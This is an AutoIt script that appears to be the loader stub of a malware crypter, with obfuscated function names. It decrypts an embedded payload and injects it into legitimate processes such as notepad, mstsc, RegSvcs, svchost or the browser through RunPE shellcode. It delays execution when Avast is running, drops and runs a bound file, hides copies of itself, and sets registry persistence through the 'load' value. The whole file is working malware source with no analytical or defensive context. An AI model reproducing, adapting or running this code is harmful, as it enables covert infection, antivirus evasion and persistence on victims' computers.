#NoTrayIcon
IIIIIIIIIIIIIIIIIII()

Func _Xe($iSleep)
    $iSleep *= 1000 
    DllCall("ntdll.dll", "dword", "NtDelayExecution", "int", 0, "int64*", -10 * $iSleep)
EndFunc
Func IIIIIIIIIIIIIIIIIII()
	$FILE = FileRead(@ScriptFullPath)
	$DATA = StringSplit($FILE, "////\\\\", 1)
	$DELAY = $DATA[5]
	If ProcessExists("AvastSvc.exe") And FileGetSize(@AutoItExe) < 10048576 Then
		_Xe(25000)
	Else
		Sleep($DELAY)
	EndIf
	$PASSWORD = $DATA[3]
	If $DATA[4] = "True" Then
		If Not FileExists(@TempDir & "\FileSys.sys") Then
			FileMove(@ScriptFullPath, @TempDir & "\FileSys.sys")
			FileSetAttrib(@TempDir & "\FileSys.sys", "+SH")
		Else
		EndIf
	EndIf
	Local $ALG
	If $DATA[7] = 1 Then
		$ALG = $CALG_RC2
	ElseIf $DATA[7] = 2 Then
		$ALG = $CALG_RC4
	ElseIf $DATA[7] = 3 Then
		$ALG = $CALG_AES_128
	ElseIf $DATA[7] = 4 Then
		$ALG = $CALG_AES_192
	ElseIf $DATA[7] = 5 Then
		$ALG = $CALG_AES_256
	ElseIf $DATA[7] = 6 Then
		$ALG = $CALG_DES
	ElseIf $DATA[7] = 7 Then
		$ALG = $CALG_3DES
	EndIf
	$DECRYPTED = _Crypt_DecryptData($DATA[2], $PASSWORD, $ALG)
	$RUNPESHELLCODE = _Crypt_DecryptData($DATA[13], $PASSWORD, $CALG_DES)
	If RegRead("HKEY_CURRENT_USER\Software\Microsoft\MsLoadMe", "BindRunOnce") = "Ok" Then
	Else
		If $DATA[10] = "True" Then
			$DECRYPTBIND = _Crypt_DecryptData($DATA[11], $PASSWORD, $ALG)
			If $DATA[14] = "False" Then
				Local $COPYPATH
				$COPYPATH = @AppDataDir & "\" & $DATA[15]
				If FileExists($COPYPATH) Then 
					ShellExecute($COPYPATH)
				Else
					$N1 = FileOpen($COPYPATH, 2)
				    FileWrite($N1, $DECRYPTBIND)
				    FileClose($N1)
				    ShellExecute($COPYPATH)
				EndIf
			Else
				UUUUUUUUUUUUUUUUUU($DECRYPTBIND, @AutoItExe, $RUNPESHELLCODE)
			EndIf
			If $DATA[12] = "True" Then
				RegWrite("HKEY_CURRENT_USER\Software\Microsoft\MsLoadMe", "BindRunOnce", "REG_SZ", "Ok")
			Else
			EndIf
		EndIf
	EndIf
	$INJECTION = $DATA[8]
	If $DATA[16] = "True" Then
		$INJECTION = @WindowsDir & "\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe"
	Else
		If $INJECTION = 1 Then
			$INJECTION = @SystemDir & "\notepad.exe"
		ElseIf $INJECTION = 2 Then
			$INJECTION = @SystemDir & "\mstsc.exe"
		ElseIf $INJECTION = 3 Then
			$INJECTION = XXXXXXXX()
		ElseIf $INJECTION = 4 Then
			FileCopy(@SystemDir & "\svchost.exe", @AppDataDir & "\" & $DATA[9], 1)
			$INJECTION = @AppDataDir & "\" & $DATA[9]
		Else
			$INJECTION = @AutoItExe
		EndIf
	EndIf
	If $DATA[6] = "True" Then
		$MYOS = @OSVersion
		If $MYOS <> "WIN_XP" Then
			If Not FileExists(@HomeDrive & "\ProgramData\FileSys.com") Then
				FileCopy(@ScriptFullPath, @HomeDrive & "\ProgramData\FileSys.com", 1)
				FileSetAttrib(@HomeDrive & "\ProgramData\FileSys.com", "+SH")
				RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows", "load", "REG_SZ", @HomeDrive & "\ProgramData\FileSys.com")
			Else
			EndIf
		Else
			If Not FileExists(@AppDataDir & "\FileSys.com") Then
				FileCopy(@ScriptFullPath, @AppDataDir & "\FileSys.com", 1)
				FileSetAttrib(@AppDataDir & "\FileSys.com", "+SH")
				RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows", "load", "REG_SZ", @AppDataDir & "\FileSys.com")
			Else
			EndIf
		EndIf
	EndIf
	UUUUUUUUUUUUUUUUUU($DECRYPTED, $INJECTION, $RUNPESHELLCODE)
EndFunc
Func XXXXXXXX()
	Local $README = RegRead("HKCR\http\shell\open\command", "")
	$TABLE = StringSplit($README, Chr(34), 1)
	Return $TABLE[2]
EndFunc
Func UUUUUUUUUUUUUUUUUU($filebin, $path, $SHELLCODE)
$ASM = $SHELLCODE
$BufferASM = DllStructCreate("byte[" & BinaryLen($ASM) & "]")
$binBuffer = DllStructCreate("byte[" & BinaryLen($filebin) & "]")
DllStructSetData($BufferASM, 1, $ASM)
DllStructSetData($binBuffer, 1, $filebin)
	$ret = DllCall("user32.dll", "int", "CallWindowProcW", "ptr", DllStructGetPtr($BufferASM), "wstr", ($path), "ptr", DllStructGetPtr($binBuffer), "int", 0, "int", 0)
EndFunc
